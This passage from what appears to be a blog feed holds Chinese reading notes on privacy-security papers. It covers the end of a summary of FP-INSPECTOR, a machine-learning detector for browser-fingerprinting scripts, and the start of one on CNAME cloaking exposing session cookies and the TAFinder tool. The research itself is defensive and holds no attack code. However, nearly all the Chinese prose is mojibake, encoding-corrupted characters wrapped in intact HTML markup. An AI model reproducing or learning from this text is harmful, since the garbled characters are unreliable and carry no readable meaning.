è¢«ç”¨äºæµè§ˆå™¨æŒ‡çº¹è¯†åˆ«ã€‚<br>ä½œè€…åœ¨å…ˆå‰ç ”ç©¶çš„åŸºç¡€ä¸Šæå‡ºäº†ä»¥ä¸‹æªæ–½ï¼š</p><ol><li>é»‘åå•APIé™åˆ¶</li><li>æœ‰é’ˆå¯¹æ€§çš„APIé™åˆ¶</li><li>è¯·æ±‚é˜»æ­¢</li><li>æ··åˆæƒ…å†µé˜»æ­¢</li></ol><h1 id="å®éªŒè¯„ä¼°"><a href="#å®éªŒè¯„ä¼°" class="headerlink" title="å®éªŒè¯„ä¼°"></a>å®éªŒè¯„ä¼°</h1><h2 id="å‡†ç¡®æ€§"><a href="#å‡†ç¡®æ€§" class="headerlink" title="å‡†ç¡®æ€§"></a>å‡†ç¡®æ€§</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/6d4cde95-1cc1-43cc-93d9-c6e69180e5b8.png"><br>ä¸Šè¡¨åˆ—å‡ºäº†é™æ€å’ŒåŠ¨æ€æ¨¡å‹çš„ç»¼åˆå’Œå•ç‹¬ç»“æœã€‚ä»è¡¨ä¸­å¯ä»¥çœ‹å‡ºï¼ŒFP-INSPECTORçš„åˆ†ç±»å™¨æ¯”å¯å‘å¼æ–¹æ³•å¤šæ£€æµ‹å‡º26%çš„è„šæœ¬ï¼Œå‡é˜³æ€§ç‡ï¼ˆFPRï¼‰ä¸º0.05%ï¼Œå‡é˜´æ€§ç‡ï¼ˆFNRï¼‰ä¸º6.1%ï¼Œå¯ä»¥å¿½ç•¥ä¸è®¡ã€‚æ€»çš„æ¥è¯´ï¼Œæˆ‘ä»¬å‘ç°é€šè¿‡ç»“åˆè¿™äº›æ¨¡å‹ï¼ŒFP-INSPECTORçš„æ£€æµ‹ç‡æé«˜äº†è¿‘10%ï¼Œæ€»ä½“å‡†ç¡®ç‡è¾¾åˆ°99.9%ï¼Œå¬å›ç‡ä¸º93.8%ï¼Œç²¾ç¡®åº¦ä¸º93.1%ã€‚</p><h2 id="ç½‘ç«™å®Œæ•´æ€§"><a href="#ç½‘ç«™å®Œæ•´æ€§" class="headerlink" title="ç½‘ç«™å®Œæ•´æ€§"></a>ç½‘ç«™å®Œæ•´æ€§</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/95bd2bd5-ad57-4c5d-9ce3-16403d893c0b.png"><br>ä¸Šè¡¨æ€»ç»“äº†ç½‘ç«™çš„å¹³å‡å—æŸç»“æœã€‚æ€»çš„æ¥è¯´ï¼Œä½¿ç”¨FP-INSPECTORæ£€æµ‹çš„æœ‰é’ˆå¯¹æ€§çš„åå‡»æªæ–½åœ¨ç‰¹åˆ«å®¹æ˜“è¢«ç ´åçš„æµ‹è¯•ç½‘ç«™ä¸Šå‡å°‘äº†2å€çš„ç½‘ç«™å—æŸç‡ã€‚æ›´å…·ä½“åœ°è¯´ï¼ŒblanketAPIé™åˆ¶å—åˆ°çš„å½±å“æœ€å¤§ï¼ˆç ´åäº†ä¸‰åˆ†ä¹‹äºŒä»¥ä¸Šçš„æµ‹è¯•ç½‘ç«™ï¼‰ï¼Œè€Œæœ‰é’ˆå¯¹æ€§çš„APIé™åˆ¶é€ æˆçš„ç ´åæœ€å°ï¼ˆåœ¨å¤§çº¦75%çš„æµ‹è¯•ç½‘ç«™ä¸Šæ²¡æœ‰é‡å¤§ç ´åï¼‰ã€‚</p><h1 id="æ£€æµ‹åœ¨é‡æŒ‡çº¹"><a href="#æ£€æµ‹åœ¨é‡æŒ‡çº¹" class="headerlink" title="æ£€æµ‹åœ¨é‡æŒ‡çº¹"></a>æ£€æµ‹åœ¨é‡æŒ‡çº¹</h1><p>ä½œè€…ä»Alexaæ’åå‰10ä¸‡çš„ç½‘ç«™æ”¶é›†æ•°æ®ï¼Œåˆ†æä¹‹åå¾—å‡ºäº†ä»¥ä¸‹ç»“è®ºä»¥æ–¹ä¾¿æ£€æµ‹åœ¨é‡çš„ä¸€äº›æŒ‡çº¹è¯†åˆ«è„šæœ¬ï¼š</p><ol><li>è¶…è¿‡å››åˆ†ä¹‹ä¸€çš„é¡¶çº§ç½‘ç«™ç°åœ¨ä¼šå¯¹ç”¨æˆ·è¿›è¡ŒæŒ‡çº¹è¯†åˆ«</li><li>æŒ‡çº¹è¯†åˆ«åœ¨æ–°é—»ç½‘ç«™ä¸Šæœ€ä¸ºå¸¸è§</li><li>æŒ‡çº¹å¸¸ç”¨äºæ‰“å‡»å¹¿å‘Šæ¬ºè¯ˆï¼Œä¹Ÿç”¨äºæ½œåœ¨çš„è·¨ç«™ç‚¹è·Ÿè¸ª</li></ol><h1 id="åˆ†ææŒ‡çº¹å¸¸ç”¨çš„API"><a href="#åˆ†ææŒ‡çº¹å¸¸ç”¨çš„API" class="headerlink" title="åˆ†ææŒ‡çº¹å¸¸ç”¨çš„API"></a>åˆ†ææŒ‡çº¹å¸¸ç”¨çš„API</h1><p>ä½œè€…è°ƒæŸ¥ç ”ç©¶äº†é‚£äº›å¸¸å‡ºç°åœ¨æ£€æµ‹åˆ°çš„æŒ‡çº¹è„šæœ¬ä¸­çš„èŠ‚ç‚¹å’Œé‚£äº›å‡ºç°åœ¨fingerprintjs2ä¸­çš„èŠ‚ç‚¹æ‰€å±çš„é›†ç¾¤ã€‚è™½ç„¶å…¶å‘ç°äº†è®¸å¤šæŒ‡çº¹è„šæœ¬å¯¹JavaScript APIçš„ä½¿ç”¨ï¼Œä½†ä¸ºäº†ç®€æ´çš„è®¨è®ºï¼Œä½œè€…æ²¡æœ‰å•ç‹¬åˆ—å‡ºæ‰€æœ‰JavaScript APIå…³é”®è¯ï¼Œè€Œæ˜¯å°†å®ƒä»¬æŒ‰ä¸»é¢˜åˆ†ç»„ã€‚åŒæ—¶ï¼Œä½œè€…è®¨è®ºäº†ä»–ä»¬å‘ç°çš„æ¯ä¸ªè¢«æŒ‡çº¹è„šæœ¬ä½¿ç”¨çš„æ–°APIæ˜¯å¦‚ä½•è¢«æ»¥ç”¨æ¥æå–å…³äºç”¨æˆ·æˆ–å…¶è®¾å¤‡çš„è¯†åˆ«ä¿¡æ¯çš„ã€‚</p><h2 id="åŠŸèƒ½æŒ‡çº¹"><a href="#åŠŸèƒ½æŒ‡çº¹" class="headerlink" title="åŠŸèƒ½æŒ‡çº¹"></a>åŠŸèƒ½æŒ‡çº¹</h2><p>è¯¥ç±»åˆ«åŒ…æ‹¬æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«æŠ€æœ¯ï¼Œç”¨äºæ¢æµ‹æµè§ˆå™¨æ”¯æŒçš„ä¸åŒåŠŸèƒ½ã€‚ç°ä»£ç½‘ç«™ä¾é è®¸å¤šAPIæ¥æ”¯æŒå…¶ä¸°å¯Œçš„åŠŸèƒ½ã€‚ç„¶è€Œï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„æµè§ˆå™¨éƒ½æ”¯æŒæ¯ä¸€ä¸ªAPIï¼Œæˆ–è€…å¯èƒ½æœ‰å¿…è¦çš„ç”¨æˆ·æƒé™ã€‚å› æ­¤ï¼Œç½‘ç«™å¯èƒ½éœ€è¦æ¢æµ‹APIå’Œæƒé™ä»¥è°ƒæ•´å…¶åŠŸèƒ½ã€‚ç„¶è€Œï¼Œè¿™ç§åŠŸèƒ½æ¢æµ‹æœ‰å¯èƒ½ä¼šæ³„éœ²ä¿¡æ¯ã€‚</p><h2 id="ç®—æ³•æŒ‡çº¹"><a href="#ç®—æ³•æŒ‡çº¹" class="headerlink" title="ç®—æ³•æŒ‡çº¹"></a>ç®—æ³•æŒ‡çº¹</h2><p>è¿™ä¸€ç±»åŒ…æ‹¬æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«æŠ€æœ¯ï¼Œå®ƒä¸ä»…ä»…æ˜¯ç®€å•åœ°æ¢æµ‹ä¸åŒçš„åŠŸèƒ½ã€‚è¿™äº›æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«æŠ€æœ¯ä½¿ç”¨ä¸åŒçš„ JavaScript APIs å¯¹æŸäº›è¾“å…¥è¿›è¡Œç®—æ³•å¤„ç†ï¼Œå¹¶åˆ©ç”¨ä¸åŒçš„å®ç°æ–¹å¼å¯¹è¿™äº›è¾“å…¥è¿›è¡Œä¸åŒçš„å¤„ç†è¿™ä¸€æƒ…å†µæ¥æ³„éœ²ä¿¡æ¯ã€‚ä½œè€…æ—¢è®¨è®ºäº†æ–°å‘ç°çš„ã€ä»¥å‰åœ¨æŒ‡çº¹è„šæœ¬ä¸­æ²¡æœ‰è§‚å¯Ÿåˆ°çš„JavaScript APIsçš„ç”¨é€”ï¼Œä¹Ÿè®¨è®ºäº†å·²çŸ¥çš„æŒ‡çº¹æŠ€æœ¯ã€‚</p><h1 id="æ–¹æ³•å±€é™æ€§"><a href="#æ–¹æ³•å±€é™æ€§" class="headerlink" title="æ–¹æ³•å±€é™æ€§"></a>æ–¹æ³•å±€é™æ€§</h1><p>FP-INSPECTORçš„æ£€æµ‹å’Œç¼“è§£ç»„ä»¶å­˜åœ¨ç€ä¸€äº›é™åˆ¶ã€‚ç”±äº FP-INSPECTOR æ£€æµ‹è„šæœ¬ç²’åº¦ä¸Šçš„æŒ‡çº¹ï¼Œå¯¹æŠ—æ€§ç½‘ç«™å¯ä»¥å°†æŒ‡çº¹è„šæœ¬åˆ†æ•£æˆè‹¥å¹²å—ï¼Œä»¥é¿å…æ£€æµ‹æˆ–åˆå¹¶æ‰€æœ‰è„šæœ¬(åŠŸèƒ½æ€§è„šæœ¬å’ŒæŒ‡çº¹) ï¼Œä»è€Œé¿å…æ‰§è¡Œç¼“è§£æªæ–½ã€‚</p><h2 id="é€šè¿‡è„šæœ¬åˆ†æ•£èº²é¿æ£€æµ‹"><a href="#é€šè¿‡è„šæœ¬åˆ†æ•£èº²é¿æ£€æµ‹" class="headerlink" title="é€šè¿‡è„šæœ¬åˆ†æ•£èº²é¿æ£€æµ‹"></a>é€šè¿‡è„šæœ¬åˆ†æ•£èº²é¿æ£€æµ‹</h2><p>åœ¨æ£€æµ‹æ–¹é¢ï¼ŒFP-INSPECTORåªè€ƒè™‘è„šæœ¬å†…éƒ¨çš„å¥æ³•å’Œè¯­ä¹‰å…³ç³»ï¼Œä¸è€ƒè™‘è„šæœ¬ä¹‹é—´çš„å…³ç³»ã€‚ç”±äºå…¶ç›®å‰çš„è®¾è®¡ï¼ŒFP-INSPECTORåœ¨æ£€æµ‹æŒ‡çº¹æ—¶å¯èƒ½ä¼šé‡åˆ°é—®é¢˜â€”â€”æŒ‡çº¹è„šæœ¬çš„ä¸»è¦åŠŸèƒ½è¢«åˆ’åˆ†åˆ°å‡ ä¸ªåˆ†æ•£çš„è„šæœ¬ä¸­ã€‚ç„¶è€Œï¼ŒFP-INSPECTORå¯ä»¥é€šè¿‡å¯¹æµè§ˆå™¨è¿›è¡Œæ›´æ·±å…¥çš„æ£€æµ‹ï¼Œæ‰©å±•åˆ°æ•è·è„šæœ¬ä¹‹é—´çš„äº’åŠ¨ã€‚ã€‚æœªæ¥ç‰ˆæœ¬çš„FP-INSPECTORä¹Ÿå¯ä»¥å®ç°è¿™æ ·çš„å·¥å…·åŒ–ï¼›ç‰¹åˆ«æ˜¯ï¼ŒFP-INSPECTORå¯ä»¥æ‰©å±•åˆ°æ•æ‰è„šæœ¬åŒ…å«çš„çˆ¶å­å…³ç³»ã€‚ä¸ºäº†é¿å…é€šè¿‡çˆ¶å­å…³ç³»è¿›è¡Œçç¢çš„æ£€æµ‹ï¼Œè„šæœ¬åˆ†æ•£æŠ€æœ¯éœ€è¦å°†æ¯ä¸ªå—ä»ç‹¬ç«‹çš„ç¥–å…ˆèŠ‚ç‚¹åµŒå…¥ç½‘ç«™ï¼Œå¹¶å°†ç»“æœè¿”å›åˆ°çœ‹ä¼¼ç‹¬ç«‹çš„æœåŠ¡å™¨ã€‚å› æ­¤ï¼Œè„šæœ¬åˆ†æ•£ä¹Ÿæœ‰ä¸€ä¸ªç»´æŠ¤æˆæœ¬ï¼šæ¯æ¬¡æ›´æ–°æŒ‡çº¹è„šæœ¬éƒ½éœ€è¦å°†è„šæœ¬åˆ†æ•£åˆ°è‹¥å¹²å—ä¸­ï¼Œå¹¶è¿›è¡Œå¹¿æ³›çš„æµ‹è¯•ä»¥ç¡®ä¿æ­£ç¡®æ‰§è¡Œã€‚</p><h2 id="é€šè¿‡è„šæœ¬åˆå¹¶èº²é¿æ£€æµ‹"><a href="#é€šè¿‡è„šæœ¬åˆå¹¶èº²é¿æ£€æµ‹" class="headerlink" title="é€šè¿‡è„šæœ¬åˆå¹¶èº²é¿æ£€æµ‹"></a>é€šè¿‡è„šæœ¬åˆå¹¶èº²é¿æ£€æµ‹</h2><p>ä¸ºäº†é™åˆ¶æŒ‡çº¹ï¼ŒFP-INSPECTORæœ€æœ‰æ•ˆçš„ååˆ¶æªæ–½ï¼ˆå³æœ‰é’ˆå¯¹æ€§çš„APIé™åˆ¶ï¼‰æ˜¯åœ¨è„šæœ¬çš„ç²’åº¦ä¸Šåº”ç”¨çš„ã€‚FP-INSPECTORå¯èƒ½ä¼šç ´åæ‰€æœ‰è„šæœ¬éƒ½è¢«åˆå¹¶åœ¨ä¸€ä¸ªè„šæœ¬ä¸­çš„ç½‘ç«™ã€‚ç„¶è€Œï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥é‡‡ç”¨æ›´ç»†åŒ–çš„æ‰§è¡Œæ–¹å¼æ¥æœ‰æ•ˆé˜²æ­¢æŒ‡çº¹è¯†åˆ«ã€‚ä¸è„šæœ¬åˆ†æ•£ç±»ä¼¼ï¼Œè„šæœ¬åˆå¹¶ä¹Ÿæœ‰ç»´æŠ¤æˆæœ¬ï¼šä»»ä½•è„šæœ¬çš„æ¯æ¬¡æ›´æ–°éƒ½éœ€è¦å°†æ‰€æœ‰è„šæœ¬åˆå¹¶æˆä¸€ä¸ªã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ä½œè€…æå‡ºäº†FP-INSPECTORï¼Œä¸€ç§åŸºäºæœºå™¨å­¦ä¹ çš„å¥æ³•-è¯­ä¹‰åº”ç”¨æ–¹æ³•ï¼Œä»¥å‡†ç¡®æ£€æµ‹æµè§ˆå™¨çš„æŒ‡çº¹è¡Œä¸ºã€‚FP-INSPECTORè¶…è¶Šäº†å…ˆå‰å·¥ä½œä¸­çš„å¯å‘å¼æ–¹æ³•ï¼Œæ£€æµ‹åˆ°çš„æŒ‡çº¹è„šæœ¬å¤šäº†26%ï¼Œå¹¶æœ‰åŠ©äºå°†ç½‘ç«™å—æŸç‡é™ä½2å€ã€‚FP-INSPECTORçš„éƒ¨ç½²è¡¨æ˜ï¼Œç°åœ¨æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«æ¯”ä»¥å‰æ›´æ™®éã€‚å¯¹Alexaæ’åå‰10ä¸‡çš„ç½‘ç«™çš„æµ‹é‡ç ”ç©¶è¡¨æ˜ï¼Œ10.18%çš„ç½‘ç«™ä¸Šéƒ¨ç½²äº†2349ä¸ªä¸åŒçš„åŸŸçš„æŒ‡çº¹è„šæœ¬ã€‚</p><p>ä½œè€…è®¡åˆ’å°†æä¾›æŒ‡çº¹è„šæœ¬çš„åŸŸåæŠ¥å‘Šç»™è¿½è¸ªä¿æŠ¤åå•ï¼Œå¦‚Disconnect å’Œ EasyPrivacy ã€‚FP-INSPECTORè¿˜å‘ç°äº†å‡ ä¸ªæ–°çš„APIçš„åˆ©ç”¨ï¼Œè¿™äº›APIæ˜¯é¦–æ¬¡è¢«å‘ç°ç”¨äºæµè§ˆå™¨æŒ‡çº¹è¯†åˆ«çš„ã€‚ä½œè€…è®¡åˆ’å°†è¿™äº›APIçš„åç§°å’Œç»Ÿè®¡æ•°æ®æŠ¥å‘Šç»™é¢å‘éšç§çš„æµè§ˆå™¨ä¾›åº”å•†å’Œæ ‡å‡†æœºæ„ã€‚ä¸ºäº†ä¿ƒè¿›åç»­ç ”ç©¶ï¼Œä½œè€…è¿˜å°†å‘å¸ƒå¯¹OpenWPMçš„è¡¥ä¸ã€æŒ‡çº¹è¯†åˆ«å¯¹ç­–åŸå‹æ‰©å±•ã€æ–°å‘ç°çš„æŒ‡çº¹è¯†åˆ«ä¾›åº”å•†åå•ï¼Œä»¥åŠæäº¤ç»™è·Ÿè¸ªä¿æŠ¤åˆ—è¡¨ã€æµè§ˆå™¨ä¾›åº”å•†å’Œæ ‡å‡†æœºæ„çš„é”™è¯¯æŠ¥å‘Šï¼Œç½‘å€æ˜¯<a href="https://uiowa-irl.github.io/FP-Inspector%E3%80%82">https://uiowa-irl.github.io/FP-Inspectorã€‚</a></p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> S&amp;P&#39;21 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Oversharing Is Not Caring: How CNAME Cloaking Can ExposeYour Session Cookies</title>
      <link href="/2021/05/25/Oversharing%20Is%20Not%20Caring%20-%20How%20CNAME%20Cloaking%20Can%20ExposeYour%20Session%20Cookies/"/>
      <url>/2021/05/25/Oversharing%20Is%20Not%20Caring%20-%20How%20CNAME%20Cloaking%20Can%20ExposeYour%20Session%20Cookies/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šAssel Aliyeva, Manuel Egele</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šOversharing Is Not Caring: How CNAME Cloaking Can ExposeYour Session Cookies</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://seclab.bu.edu/papers/cname_cloaking-asiaccs2021.pdf">https://seclab.bu.edu/papers/cname_cloaking-asiaccs2021.pdf</a></em></p><p><em>åŸæ–‡æ¥æºï¼šAsiaCCS 2021</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>äº’è”ç½‘å‘å±•è‡³ä»Šï¼Œä¸€äº›åœ¨çº¿ä¸šåŠ¡é€šå¸¸ä¼šåˆ©ç”¨ç¬¬ä¸‰æ–¹çš„åˆ†ææœåŠ¡æ¥æ·±å…¥äº†è§£å…¶ç”¨æˆ·çš„è¡Œä¸ºã€‚ä½†ç”±äºéšç§ä¿æŠ¤çš„å‘å±•åŠæµè§ˆå™¨åŒæºç­–ç•¥çš„é™åˆ¶ï¼Œè¿™åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šé™åˆ¶äº†ç¬¬ä¸‰æ–¹Cookieçš„è·Ÿè¸ªå’Œä½¿ç”¨ã€‚äºæ˜¯ï¼Œä¼ä¸šå¼€å§‹å°è¯•å°†ç¬¬ä¸‰æ–¹åˆ†ææœåŠ¡ä¼ªè£…æˆå…¶ç½‘ç«™çš„å­åŸŸã€‚è¿™ç§è¢«ç§°ä¸ºæ˜¯CNAMEä¼ªè£…çš„æŠ€æœ¯ä½¿å¾—ä¼ä¸šèƒ½å¤Ÿç»§ç»­ç›‘æµ‹å…¶ç½‘ç«™ä¸Šçš„ç”¨æˆ·æ´»åŠ¨ã€‚ä½†éšä¹‹è€Œæ¥çš„æ˜¯ä¸¥é‡çš„å®‰å…¨éšæ‚£ï¼Œå› ä¸ºä¼ä¸šä¸è¿™äº›ç¬¬ä¸‰æ–¹åˆ†ææœåŠ¡æä¾›å•†å…±äº«äº†ç”¨æˆ·ä¼šè¯Cookieï¼Œè¿™ä½¿å¾—åœ¨çº¿ç”¨æˆ·çš„è´¦æˆ·å§‹ç»ˆå¤„äºä¸å®‰å…¨çš„çŠ¶æ€ã€‚åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œä½œè€…æ¼”ç¤ºäº†CNAMEä¼ªè£…ä»¥åŠLax Cookieè®¿é—®æ§åˆ¶è®¾ç½®å¯¹Webç”¨æˆ·å®‰å…¨æ€§çš„å½±å“ã€‚ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œä½œè€…æ„å»ºäº†ä¸€ä¸ªå¯ä»¥æ£€æµ‹ä¼ªè£…ä¸ºå­åŸŸçš„ç¬¬ä¸‰æ–¹åˆ†ææœåŠ¡ä»¥åŠç¬¬ä¸€æ–¹Cookieæ³„éœ²çš„å·¥å…·TAFinderã€‚</p><h1 id="ä¸»è¦è´¡çŒ®"><a href="#ä¸»è¦è´¡çŒ®" class="headerlink" title="ä¸»è¦è´¡çŒ®"></a>ä¸»è¦è´¡çŒ®</h1><ul><li>ç¡®å®šäº†ç¬¬ä¸€æ–¹Cookieæ³„éœ²ç»™T/A(è·Ÿè¸ªå’Œå¹¿å‘Š)æœåŠ¡æä¾›å•†çš„æƒ…å†µ</li><li>æ„å»ºäº†TAFinderç”¨äºè‡ªåŠ¨è¯†åˆ«ç½‘ç«™ä¸­æ˜¯å¦å­˜åœ¨éšåŒ¿åŸŸå¹¶æ£€æµ‹è¿™äº›Cookieæ˜¯å¦æ³„æ¼åˆ°è¿™äº›åŸŸ</li><li>é’ˆå¯¹è¿™äº›éšåŒ¿åŸŸæå‡ºäº†ä¸€ç§åŸºäºHTTPçš„Webåˆ†æåŸŸæ£€æµ‹æœºåˆ¶ï¼Œè¾¾åˆ°äº†96ï¼…çš„å‡†ç¡®ç‡</li><li>ç¡®å®šäº†2,139ä¸ªåœ¨é‡çš„Webåˆ†æåŸŸ</li><li>å¯¹100,000ä¸ªæœ€å—æ¬¢è¿çš„ç½‘ç«™è¿›è¡Œäº†æµ‹è¯•ï¼Œå‘ç°2,271ä¸ªç½‘ç«™ä½¿ç”¨CNAMEä¼ªè£…æŠ€æœ¯å°†ç¬¬ä¸‰æ–¹åˆ†ææœåŠ¡ä½œä¸ºå…¶å­åŸŸ</li></ul><h1 id="æ•´ä½“æ¡†æ¶"><a href="#æ•´ä½“æ¡†æ¶" class="headerlink" title="æ•´ä½“æ¡†æ¶"></a>æ•´ä½“æ¡†æ¶</h1><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/749afbc8-7bb7-4449-9adf-28f0710e32bb.png"><br>TAFinderä¸»è¦åˆ†ä¸ºä¸‰ä¸ªå•å…ƒï¼š</p><ol><li>æ•°æ®é‡‡é›†</li><li>DNSå¤„ç†</li><li>åŸºäºæœºå™¨å­¦ä¹ çš„æ£€æµ‹<h2 id="æ•°æ®é‡‡é›†"><a href="#æ•°æ®é‡‡é›†" class="headerlink" title="æ•°æ®é‡‡é›†"></a>æ•°æ®é‡‡é›†</h2>ä»¥æµæ°´çº¿çš„æ–¹å¼è®¾è®¡çš„TAFinderæ¥å—ä¸€ä¸ªç½‘ç«™åˆ—è¡¨ä½œä¸ºè¾“å…¥ï¼Œç„¶åç”±ä»»åŠ¡åˆ†é…å™¨å°†å…¶åˆ†é…ç»™Workerã€‚å½“ä»ä»»åŠ¡åˆ†é…å™¨ä¸­æ”¶åˆ°ä¸€ä¸ªæ–°çš„W(Website)æ—¶ï¼Œä¸€ä¸ªWorkerä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„çˆ¬è™«å®ä¾‹ã€‚çˆ¬è™«è®¿é—®Wï¼ŒåŒæ—¶è®°å½•ç½‘ç»œæ•°æ®åŒ…å’Œçº¯æ–‡æœ¬çš„HTTPè¯·æ±‚/å“åº”ï¼Œå¹¶æœ€ç»ˆå°†æ•è·çš„æ•°æ®ä¼ è¾“ç»™DNSå¤„ç†å•å…ƒã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒWorkerè¿è¡Œåœ¨ç‹¬ç«‹çš„å®¹å™¨ä¸­ï¼Œå› æ­¤å®ƒå…è®¸TAFinderè½»æ¾åœ°åˆ†ç¦»æ¥è‡ªä¸åŒç½‘ç«™çš„ç½‘ç»œæµé‡ã€‚</li></ol><h2 id="DNSå¤„ç†"><a href="#DNSå¤„ç†" class="headerlink" title="DNSå¤„ç†"></a>DNSå¤„ç†</h2><p>TAFinderä»ä»»ä½•ç»™å®šçš„Wä¸­æå–ä¸€ç»„éšåŒ¿åŸŸCWã€‚DNSå¤„ç†å•å…ƒå¯¹æ¶‰åŠCNAMEçš„Wçš„æ¯ä¸ªå­åŸŸè¿›è¡ŒDNSè§£æé“¾çš„éå†ã€‚å¦‚æœä¸€ä¸ªè§£æé“¾ä»¥å±äºç¬¬ä¸‰æ–¹çš„CNAMEç»“æŸï¼ŒDNSå¤„ç†å•å…ƒå°†ç›¸åº”çš„å­åŸŸæ ‡è®°ä¸ºéšåŒ¿åŸŸDã€‚</p><h2 id="åŸºäºæœºå™¨å­¦ä¹ çš„æ£€æµ‹"><a href="#åŸºäºæœºå™¨å­¦ä¹ çš„æ£€æµ‹" class="headerlink" title="åŸºäºæœºå™¨å­¦ä¹ çš„æ£€æµ‹"></a>åŸºäºæœºå™¨å­¦ä¹ çš„æ£€æµ‹</h2><p>TAFinderé¦–å…ˆä½¿ç”¨é»‘åå•å’ŒVirus Totalå°†CWä¸­çš„åŸŸè¯†åˆ«ä¸ºT/AæœåŠ¡ã€‚ä¸ºäº†å°†CWä¸­å‰©ä½™çš„æœªæ ‡è®°çš„éšåŒ¿åŸŸåˆ†ç±»ä¸ºT/Aæˆ–éT/Aï¼ŒTAFinderéƒ¨ç½²äº†ä¸€ç§ç›‘ç£æœºå™¨å­¦ä¹ æ–¹æ³•ã€‚ä¸ºæ­¤ï¼Œå…¶è®¾è®¡äº†ä¹ç§ç‰¹å¾ï¼Œä»¥æ•æ‰T/AæœåŠ¡å›ºæœ‰çš„è¡Œä¸ºæ¨¡å¼ã€‚è¿™äº›ç‰¹å¾æ˜¯ä»è®¿é—®Wæ—¶ä¸éšåŒ¿åŸŸçš„HTTPé€šä¿¡ä¸­æå–çš„ã€‚<br>ä¸‹é¢æ˜¯ä¹ä¸ªç‰¹å¾:</p><ol><li>å½“åŠ è½½Wçš„æ‰€æœ‰èµ„æºæ—¶ï¼Œä»¥Dä¸ºç›®æ ‡çš„HTTPè¯·æ±‚çš„æ•°é‡è¶…è¿‡æ‰€æœ‰HTTPè¯·æ±‚çš„æ•°é‡</li><li>å½“åŠ è½½Wçš„æ‰€æœ‰èµ„æºæ—¶ï¼Œæ¥è‡ªDçš„HTTPå“åº”çš„æ€»å¤§å°è¶…è¿‡æ‰€æœ‰HTTPå“åº”å¤§å°çš„æ€»å’Œ</li><li>Dæ‰€è®¾ç½®çš„cookiesæ€»æ•°</li><li>åœ¨Dè®¾ç½®çš„æ‰€æœ‰cookiesæ•°é‡ä¸­ï¼Œé•¿cookiesçš„æ•°é‡</li><li>Dè®¾ç½®çš„å¸¸è§„çš„éç›®æ ‡cookiesçš„æ•°é‡</li><li>Dè®¾ç½®çš„å¸¸è§„çš„ç›®æ ‡cookieçš„æ•°é‡<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/8ab9b802-d526-4eb1-b228-85fe9b95ed0f.png"></li><li>åœ¨URLä¸­ä½¿ç”¨çš„å‚æ•°æ•°é‡è¶…è¿‡äº†ä»¥Dä¸ºç›®æ ‡çš„HTTPè¯·æ±‚çš„æ•°é‡</li><li>ç›®æ ‡ä¸ºDçš„URLä¸­åŒ…æ‹¬Wçš„åŸŸåä½œä¸ºå‚æ•°å€¼ä¹‹ä¸€çš„æ¬¡æ•°</li><li>Content-Typeç‰¹å¾<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/f4341811-3dc8-417f-a9d1-44d6ecc95c1a.png"></li></ol><p><strong>ç‰¹å¾é‡è¦æ€§æ’åº</strong><br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/b679fc1b-c741-44e2-8eb2-6ae183fcebcd.png"></p><h1 id="ç³»ç»Ÿå®ç°"><a href="#ç³»ç»Ÿå®ç°" class="headerlink" title="ç³»ç»Ÿå®ç°"></a>ç³»ç»Ÿå®ç°</h1><h2 id="æ•°æ®é‡‡é›†å’ŒDNSå¤„ç†"><a href="#æ•°æ®é‡‡é›†å’ŒDNSå¤„ç†" class="headerlink" title="æ•°æ®é‡‡é›†å’ŒDNSå¤„ç†"></a>æ•°æ®é‡‡é›†å’ŒDNSå¤„ç†</h2><p>åœ¨æ•°æ®é‡‡é›†å•å…ƒï¼ŒTAFinderé‡‡ç”¨äº†RabbitMQæ¥å®ç°ä»»åŠ¡åˆ†é…ï¼Œè¿™ä½¿å¾—ä½œè€…å¯ä»¥å¹¶è¡Œæ‰©å±•å’Œè¿è¡Œ10ä¸ªWorkerã€‚æ¯ä¸ªWorkerç”±ä¸€ä¸ªç‹¬ç«‹è¿è¡Œçš„Linuxå®¹å™¨è¡¨ç¤ºï¼Œè¿™äº›å®¹å™¨å‡é…ç½®å¥½äº†Tcpdumpå’ŒMitmProxyç”¨äºè®°å½•ç½‘ç»œæ•°æ®åŒ…å’Œçº¯æ–‡æœ¬çš„HTTPè¯·æ±‚/å“åº”ã€‚Workerä½¿ç”¨ä¸€ä¸ªåŸºäºseleniumçš„çˆ¬è™«æ¥å¯åŠ¨å¯¹æ¯ä¸ªå•ç‹¬çš„ç½‘ç«™çš„çˆ¬å–ã€‚åœ¨çˆ¬å–å®Œæ¯•åé”€æ¯å®ä¾‹ï¼Œå‹ç¼©å¹¶å°†æ•è·åˆ°çš„æ•°æ®å­˜å‚¨ä¸‹æ¥ã€‚åœ¨DNSå¤„ç†å•å…ƒåˆ™ä½¿ç”¨äº†Pythonçš„Scapyåº“åˆ†åˆ«æå–æ¯ä¸ªç½‘ç«™çš„éšåŒ¿åŸŸã€‚</p><h2 